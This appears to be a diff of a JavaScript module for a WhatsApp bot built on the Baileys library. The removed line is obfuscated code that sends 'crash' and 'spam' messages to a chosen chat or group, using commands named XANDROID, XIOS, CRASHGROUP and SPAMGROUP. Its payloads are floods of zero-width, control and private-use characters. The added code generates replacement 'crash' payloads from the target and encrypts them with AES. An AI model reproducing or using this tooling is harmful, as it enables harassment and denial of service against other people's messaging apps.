@@ -1,1 +1,18 @@
-function _0xda37(){const _0x4eed1e=['6493004MnvCdC','3632233knuMkj','112689KbIzVd','@adiwajshing/baileys','11085046ogcOaH','repeat','join','Erreur\x20payload:','􀿃􀿄􀿅􀿆􀿇','40PKpzsU','base64','576UrnxlY','XIOS','fill','56874tkLkua','30JpiFML','155952igBpqg','CRASHGROUP','155380SoFwZU','SPAMGROUP','Commande\x20inconnue','toString','error','sendMessage','fromCharCode','Échec\x20de\x20l\x27envoi\x20du\x20payload','6VeTGJh','from'];_0xda37=function(){return _0x4eed1e;};return _0xda37();}const _0x468d1f=_0xb6bf;function _0xb6bf(_0x56b26e,_0x210918){const _0xda3717=_0xda37();return _0xb6bf=function(_0xb6bf3a,_0x46e1a4){_0xb6bf3a=_0xb6bf3a-0x78;let _0x175a11=_0xda3717[_0xb6bf3a];return _0x175a11;},_0xb6bf(_0x56b26e,_0x210918);}(function(_0x1be084,_0x54c368){const _0x3b2d52=_0xb6bf,_0x12e8ac=_0x1be084();while(!![]){try{const _0x111f0b=parseInt(_0x3b2d52(0x79))/0x1+-parseInt(_0x3b2d52(0x83))/0x2*(-parseInt(_0x3b2d52(0x93))/0x3)+parseInt(_0x3b2d52(0x85))/0x4+parseInt(_0x3b2d52(0x7b))/0x5*(parseInt(_0x3b2d52(0x78))/0x6)+-parseInt(_0x3b2d52(0x89))/0x7+-parseInt(_0x3b2d52(0x90))/0x8*(parseInt(_0x3b2d52(0x87))/0x9)+-parseInt(_0x3b2d52(0x8e))/0xa*(-parseInt(_0x3b2d52(0x86))/0xb);if(_0x111f0b===_0x54c368)break;else _0x12e8ac['push'](_0x12e8ac['shift']());}catch(_0x3af66f){_0x12e8ac['push'](_0x12e8ac['shift']());}}}(_0xda37,0xc9f2b));const {WAProto}=require(_0x468d1f(0x88));module['exports']={'sendPayload':async(_0x1179bf,_0x45276c,_0x123776)=>{const _0x6cc9ae=_0x468d1f;try{let _0x356082;switch(_0x123776){case'XANDROID':_0x356082=generateAndroidCrashPayload();break;case _0x6cc9ae(0x91):_0x356082=generateiOSCrashPayload();break;case _0x6cc9ae(0x7a):_0x356082=generateGroupCrashPayload();break;case _0x6cc9ae(0x7c):_0x356082=generateGroupSpamPayload();break;default:throw new Error(_0x6cc9ae(0x7d));}const _0x50de7b={'conversation':_0x356082};return await _0x1179bf[_0x6cc9ae(0x80)](_0x45276c,_0x50de7b),!![];}catch(_0x17bb63){console[_0x6cc9ae(0x7f)](_0x6cc9ae(0x8c),_0x17bb63);throw new Error(_0x6cc9ae(0x82));}}};function generateGroupCrashPayload(){const _0xbcd6e9=_0x468d1f;return String[_0xbcd6e9(0x81)](0x200b,0x200b,0x200b)[_0xbcd6e9(0x8a)](0x3e8);}function generateGroupSpamPayload(){const _0x33c3d6=_0x468d1f;return Array(0x3e8)[_0x33c3d6(0x92)]('\x02')[_0x33c3d6(0x8b)]('');}function generateAndroidCrashPayload(){const _0x2e9145=_0x468d1f;return Buffer[_0x2e9145(0x84)]([0xfe,0xed,0xfa,0xce])[_0x2e9145(0x7e)](_0x2e9145(0x8f));}function generateiOSCrashPayload(){const _0x3b4fdb=_0x468d1f;return _0x3b4fdb(0x8d)[_0x3b4fdb(0x8a)](0x64);}
+const CryptoJS = require('crypto-js');
+const { SECURITY } = require('./config');
+
+const encryptPayload = (data) => {
+    return CryptoJS.AES.encrypt(data, SECURITY.ENCRYPTION_KEY).toString();
+};
+
+module.exports = {
+    generateAndroidPayload: (target) => {
+        const payload = `*#${target}*${Math.random().toString(36).substring(7)}`;
+        return encryptPayload(payload);
+    },
+
+    generateIOSPayload: (target) => {
+        const payload = `;crash=${target};${Date.now()}`;
+        return encryptPayload(payload);
+    }
+};
